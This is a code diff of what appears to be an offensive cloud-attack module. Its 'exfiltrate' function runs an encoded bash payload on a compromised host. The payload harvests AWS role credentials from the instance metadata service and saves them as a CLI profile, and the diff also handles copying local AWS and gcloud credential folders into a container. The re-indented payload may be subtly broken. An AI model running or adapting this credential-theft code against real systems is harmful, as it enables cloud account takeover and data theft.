@@ -47,26 +47,25 @@ class Module(BaseModule):
             def exfiltrate(csp):
                 # create an instance profile to exfiltrate
                 if csp == "aws":
-                    payload = base64.b64encode('''
-    opts="--no-cli-pager"
-    INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
-    AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-    AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-    AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-    AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
-    cat > .aws-ec2-instance <<-EOF
-    AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
-    AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
-    AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
-    AWS_DEFAULT_REGION=us-east-1
-    AWS_DEFAULT_OUTPUT=json
-    EOF
-    PROFILE="instance"
-    aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
-    aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
-    aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
-    aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
-    aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
+                    payload = base64.b64encode('''opts="--no-cli-pager"
+                                                INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
+                                                AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+                                                AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+                                                AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+                                                AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
+                                                cat > .aws-ec2-instance <<-EOF
+                                                AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
+                                                AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
+                                                AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
+                                                AWS_DEFAULT_REGION=us-east-1
+                                                AWS_DEFAULT_OUTPUT=json
+                                                EOF
+                                                PROFILE="instance"
+                                                aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
+                                                aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
+                                                aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
+                                                aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
+                                                aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     log("creating an instance creds profile...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
@@ -189,10 +188,11 @@ class Module(BaseModule):
 
                         # assume credentials prep added creds to local home
                         if csp == "aws":
-                            local_creds = "$HOME/.aws"
+                            local_creds = os.path.expandvars("$HOME/.aws")
                             container_creds = "/root/.aws"
                         elif csp == "gcp":
-                            local_creds = "$HOME/.config/gcloud"
+                            local_creds = os.path.expandvars(
+                                "$HOME/.config/gcloud")
                             container_creds = "/root/.config/gcloud"
 
                         payload = base64.b64encode(
